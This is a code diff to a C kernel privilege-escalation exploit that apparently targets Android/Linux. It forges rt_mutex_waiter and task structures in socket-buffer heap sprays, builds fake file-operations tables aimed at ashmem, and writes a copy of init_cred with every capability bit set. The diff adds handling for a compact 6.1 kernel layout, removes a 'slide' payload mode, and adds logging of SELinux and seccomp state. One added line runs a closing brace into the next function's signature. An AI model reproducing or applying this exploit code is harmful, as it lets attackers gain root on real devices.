@@ -48,10 +48,14 @@ void clear_pselect_write(void) {
   pselect_custom_value = 0;
 }
 
-void setup_kernelsnitch(void) {
+void setup_kernelsnitch_sized(size_t mm_struct_size) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      mm_struct_size, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+}
+
+void setup_kernelsnitch(void) {
+  setup_kernelsnitch_sized(MM_STRUCT_SZ);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -97,6 +101,7 @@ void log_startup_context(void) {
   char attr[256];
   char enforce[32];
   char status[4096];
+  char cwd[256] = "unreadable";
   char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
   read_first_line("/proc/self/attr/current", attr, sizeof(attr));
   read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
@@ -131,6 +136,18 @@ void log_startup_context(void) {
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
+  if (!getcwd(cwd, sizeof(cwd))) {
+    snprintf(cwd, sizeof(cwd), "unreadable");
+  }
+  int open_fds = -1;
+  DIR *fd_dir = opendir("/proc/self/fd");
+  if (fd_dir) {
+    open_fds = 0;
+    while (readdir(fd_dir) != NULL) open_fds++;
+    closedir(fd_dir);
+  }
+  pr_success("startup shape pid=%d ppid=%d pgid=%d sid=%d fds=%d cwd=%s\n",
+             getpid(), getppid(), getpgrp(), getsid(0), open_fds, cwd);
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
@@ -144,17 +161,6 @@ void log_startup_context(void) {
              (unsigned long long)SLIDE_INIT_TASK,
              (unsigned long long)SLIDE_ROOT_TASK_GROUP,
              (unsigned long long)SLIDE_SYSCTL_BOOTID);
-}
-
-void log_slide_child_context(void) {
-  char attr[256];
-  char enforce[32];
-  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
-  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
-  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
-             "egid=%u attr=%s enforce=%s\n",
-             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
-             attr, enforce);
 }
 
 void disable_rseq_for_thread(void) {
@@ -314,11 +320,9 @@ static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
   memset(c, 0, 136);
   put32(c, 0, 1);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
+    put64(c, CRED_CAPS_OFF + i * 8, 0xFFFFFFFFFFFFFFFFULL);
+  }
 }
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
@@ -463,7 +467,8 @@ int clone_memfd(void) {
 }
 
 void prepare_ctxs(int payload_mode) {
-  int prepare_slabs = payload_mode == PAGE_PAYLOAD_SLIDE ? 8 : 8;
+  (void)payload_mode;
+  int prepare_slabs = 8;
   prepare_ctx.mm_cnt = prepare_slabs * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
@@ -490,39 +495,32 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_w0 = payload_base + W0_OFF;
   fake_task = payload_base + FAKE_TASK_OFF;
   fake_fops = payload_base + FOPS_TABLE_OFF;
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    if (pselect_custom_write) {
-      if (pselect_child_node) {
-        if (pselect_custom_write == 2) {
-          /* W2 uses init_cred; resolve it from the selected device entry. */
-          fake_right = data_addr(g_init_cred_image);
-        } else {
-          /* W1 targets the initialized page at base+0x100. */
-          fake_right = base + 0x100;
-        }
-      } else {
-        fake_right = 0;  /* leaf: write 0 */
-      }
-      fake_left = 0;
+  if (pselect_custom_write) {
+    if (pselect_child_node) {
       if (pselect_custom_write == 2) {
-        fake_fops = payload_base + CRED_COPY_OFF;
-      }
-      fake_parent = pselect_custom_target - 8;
-      if (!pselect_custom_value) {
-        pselect_custom_value = fake_fops;
+        /* W2 uses init_cred; resolve it from the selected device entry. */
+        fake_right = data_addr(g_init_cred_image);
+      } else {
+        /* W1 targets the initialized page at base+0x100. */
+        fake_right = base + 0x100;
       }
     } else {
-      fake_parent = fake_fops;
-      fake_right = data_addr(ASHMEM_MISC_FOPS);
-      fake_left = 0;
+      fake_right = 0;  /* leaf: write 0 */
     }
-    binwrite_target = payload_base + SCRATCH_OFF;
+    fake_left = 0;
+    if (pselect_custom_write == 2) {
+      fake_fops = payload_base + CRED_COPY_OFF;
+    }
+    fake_parent = pselect_custom_target - 8;
+    if (!pselect_custom_value) {
+      pselect_custom_value = fake_fops;
+    }
   } else {
-    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
-    fake_right = fake_fops;
-    fake_left = payload_base + LEFT_OFF;
-    binwrite_target = payload_base + FOPS_OFF + 0x700;
+    fake_parent = fake_fops;
+    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_left = 0;
   }
+  binwrite_target = payload_base + SCRATCH_OFF;
 
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
@@ -530,62 +528,51 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
-    write_right = 0;
-    write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    waiter_task = SLIDE_INIT_TASK;
-    task_group = SLIDE_ROOT_TASK_GROUP;
-    pi_top_task = SLIDE_INIT_TASK;
-  }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     put32(p, LOCK_OFF + 0x00, 0);
-    if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-    } else {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
-    }
+    put64(p, LOCK_OFF + 0x08, fake_w0);
+    put64(p, LOCK_OFF + 0x10, fake_w0);
+    put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
     put64(p, W0_OFF + 0x00, 1);
     put64(p, W0_OFF + 0x08, 0);
     put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    if (WAITER_COMPACT) {
+      /* 6.1 compact rt_mutex_waiter (0x58): pi_tree_entry 0x18, task 0x30,
+       * lock 0x38, wake_state 0x40, prio 0x44, deadline 0x48, ww_ctx 0x50. */
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF + 0x04, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + 0x48, 0);
+      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    } else {
+      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    }
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      if (pselect_custom_write) {
-        /* Empty PI waiters avoid tree rebalancing during reinsertion. */
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-      } else {
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-      }
-    } else {
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-    }
+    /* Empty PI waiters avoid tree rebalancing during reinsertion. */
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
@@ -598,11 +585,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      put_fake_fops_table(p, FOPS_TABLE_OFF);
-      if (pselect_custom_write >= 2) {
-        fill_init_cred_copy(p, CRED_COPY_OFF);
-      }
+    put_fake_fops_table(p, FOPS_TABLE_OFF);
+    if (pselect_custom_write >= 2) {
+      fill_init_cred_copy(p, CRED_COPY_OFF);
     }
   }
   return 1;
@@ -812,12 +797,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 }
 
 uintptr_t prepare_good_kernel_page(int payload_mode) {
-  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
-  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
-    max_attempts = 4;
-  }
+  int max_attempts = payload_mode == PAGE_PAYLOAD_FOPS
+      ? 4 : KERNEL_PAGE_SETUP_ATTEMPTS;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
@@ -908,7 +889,12 @@ ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
 uintptr_t pselect_write_value(void) {
   return pselect_custom_value;
 }
-uintptr_t pselect_write_target(void) {
+
+uint64_t mono_ns(void) {
+  struct timespec ts;
+  clock_gettime(CLOCK_MONOTONIC, &ts);
+  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
+}uintptr_t pselect_write_target(void) {
   return pselect_custom_target;
 }
 int pselect_custom_write_enabled(void) {
